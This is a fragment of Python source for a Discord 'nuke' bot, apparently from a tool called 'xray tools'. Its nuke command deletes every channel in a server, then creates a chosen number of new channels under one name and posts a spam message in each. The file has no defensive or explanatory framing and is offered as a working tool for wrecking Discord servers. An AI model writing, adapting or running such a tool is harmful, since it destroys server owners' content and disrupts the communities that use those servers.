
init(autoreset=True)

RED = Fore.RED
GREEN = Fore.GREEN

@bot.event
async def on_ready():
    print(GREEN + "[INFO] Bot is now online !")
    print(RED + f"[INFO] For the nuke, send a command with this syntax : {prefix}nuke <channel_number> | <message to spam> | <channels name> Example : {prefix}nuke 125 | THIS SERVER IS NUKE | nuke by xray tools")
    print(RED + "[INFO] Waiting for a command...")

@bot.command()
async def nuke(ctx, *, args):
    clear.clear()
    print(RED + "[INFO] Nuke starting...")
    args_list = args.split("|")
    channel_number = int(args_list[0])
    message_channel = args_list[1]
    channel_name = args_list[2]

    print(RED + f"[INFO] Nuke settings : Channel count = {channel_number} | Message = {message_channel} | Channels name = {channel_name}")

    for channel in ctx.guild.channels:
        print(RED + f"[INFO] Channel deleted : {channel.name}")
        await channel.delete()

    for i in range(channel_number):
        new_channel = await ctx.guild.create_text_channel(channel_name)
        print(RED + "[INFO] Channel created")
        await new_channel.send(message_channel)
    print(RED + "[INFO] Nuke ended")
    input(RED + "\n[INPUT] Press ENTER to continue...")
    await bot.close()
try:    
    bot.run(BOT_TOKEN)
except Exception as e:
    print(RED + f"[ERROR] An error occured while launching the bot : {e}")
    input(RED + "\n[INPUT] Press ENTER to continue...")